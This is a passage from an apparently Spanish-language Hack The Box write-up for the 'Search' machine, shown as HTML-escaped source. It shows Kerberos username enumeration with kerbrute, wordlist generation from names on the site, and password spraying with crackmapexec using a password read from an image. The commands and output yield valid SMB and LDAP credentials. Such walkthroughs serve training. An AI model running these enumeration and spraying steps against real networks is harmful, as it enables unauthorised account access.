2022/04/01 19:10:24 &amp;gt;   10.10.11.129:88

2022/04/01 19:10:55 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    administrator@search.htb
2022/04/01 19:11:09 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    research@search.htb
2022/04/01 19:11:51 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    Administrator@search.htb
2022/04/01 19:51:39 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    RESEARCH@search.htb
2022/04/01 19:54:18 &amp;gt;  Done! Tested &lt;span class=&#34;m&#34;&gt;624370&lt;/span&gt; usernames &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; valid&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; in 2634.573 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;usernames&#34;&gt;Usernames&lt;/h2&gt;
&lt;p&gt;Si recordamos, en el sitio web hay una lista de nombres (en el apartado Team), utilizamos estos para crear un nuevo wordlist utilizando un &lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/wordlist/usernames.py&#34;&gt;Script&lt;/a&gt; en python.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
John Smith 
Christine Aguilar 
Robert Spears 
Bruce Rogers
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Generamos 120 posibles nombres de usuarios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/usernames ‚ùØ ./usernames.py team.txt &amp;gt; users.txt
 œÄ ~/htb/search/usernames ‚ùØ wc -l users.txt
&lt;span class=&#34;m&#34;&gt;120&lt;/span&gt; users.txt
 œÄ ~/htb/search/usernames ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos tres nombres de usuarios v√°lidos con &lt;code&gt;kerbrute&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ  ./kerbrute userenum -d search.htb usernames/users.txt --dc 10.10.11.129

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/

Version: v1.0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 20:24:26 &amp;gt;  Using KDC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
2022/04/01 20:24:26 &amp;gt;   10.10.11.129:88

2022/04/01 20:24:26 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    keely.lyons@search.htb
2022/04/01 20:24:26 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    dax.santiago@search.htb
2022/04/01 20:24:26 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    sierra.frye@search.htb
2022/04/01 20:24:27 &amp;gt;  Done! Tested &lt;span class=&#34;m&#34;&gt;120&lt;/span&gt; usernames &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; valid&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; in 0.849 seconds
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sin embargo ninguna combinaci√≥n de los usuarios v√°lidos nos permitio acceder por smb/ldap/rpc.&lt;br /&gt;
&lt;div class=&#34;expand&#34;&gt;
  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
    &lt;/span&gt;
    Usuarios V√°lidos
  &lt;/button&gt;
  &lt;div class=&#34;expand__content&#34;&gt;
    &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;keely.lyons
dax.santiago
sierra.frye
administrator
research
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/p&gt;
&lt;h2 id=&#34;note---creds&#34;&gt;Note - Creds&lt;/h2&gt;
&lt;p&gt;En el sitio web descubrimos una imagen donde se leen notas, en esta se mencionan nombres y una contrase√±a para &amp;lsquo;Hope Sharp&amp;rsquo;, vemos &lt;code&gt;IsolationIsKey?&lt;/code&gt;, la cual podr√≠a ser la contrase√±a.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_070746.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos un wordlist con los nombres de usuarios y las palabras &amp;ldquo;relevantes&amp;rdquo;, nuevamente utilizamos el &lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/wordlist/usernames.py&#34;&gt;Script&lt;/a&gt; en python.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Working from Home
Key staff to stay
Hospital Appointment
Harrods
9am Phisher Walter
Send password to Hope Sharp
IsolationIsKey?
Meeting with Board
Hunter and Jordan
Hunter Jordan
Jordan Hunter
Harrods Jordan
Harrods Hunter
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;code&gt;kerbrute&lt;/code&gt; con el nuevo wordlist, vemos que &lt;code&gt;hope.sharp&lt;/code&gt; es un usuario v√°lido.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ ./kerbrute userenum -d search.htb --dc 10.10.11.129 wordlist_image.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/

Version: v1.0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 21:14:28 &amp;gt;  Using KDC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
2022/04/01 21:14:28 &amp;gt;   10.10.11.129:88

2022/04/01 21:14:28 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:    hope.sharp@search.htb
2022/04/01 21:14:28 &amp;gt;  Done! Tested &lt;span class=&#34;m&#34;&gt;70&lt;/span&gt; usernames &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; valid&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; in 0.506 seconds
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;smb---hope-sharp&#34;&gt;SMB - Hope Sharp&lt;/h1&gt;
&lt;h2 id=&#34;password-spraying&#34;&gt;Password Spraying&lt;/h2&gt;
&lt;p&gt;Utilizamos el wordlist con todos los usuarios v√°lidos que encontramos y realizamos Password Spraying con la &amp;ldquo;contrase√±a&amp;rdquo; &lt;code&gt;IsolationIsKey?&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;expand&#34;&gt;
  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
    &lt;/span&gt;
    Usuarios V√°lidos
  &lt;/button&gt;
  &lt;div class=&#34;expand__content&#34;&gt;
    &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;keely.lyons
dax.santiago
sierra.frye
administrator
research
hope.sharp
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Observamos que &lt;code&gt;hope.sharp&lt;/code&gt; es una combinaci√≥n v√°lida, como se menciona en la nota.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ crackmapexec smb search.htb -u usernames/valid_users.txt -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;IsolationIsKey?&amp;#39;&lt;/span&gt; --continue-on-success
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\k&lt;/span&gt;eely.lyons:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;ax.santiago:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;dministrator:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;esearch:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;ope.sharp:IsolationIsKey?
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos tambien que las credenciales permiten el acceso por ldap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ crackmapexec ldap search.htb -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;hope.sharp&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;IsolationIsKey?&amp;#39;&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
LDAP        search.htb      &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;ope.sharp:IsolationIsKey?
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Enumeramos los recursos compartidos a los que &lt;code&gt;Hope&lt;/code&gt; tiene acceso, vemos: &lt;code&gt;CertEnroll, RedirectedFolders$&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ crackmapexec smb search.htb -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;hope.sharp&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;IsolationIsKey?&amp;#39;&lt;/span&gt; --shares
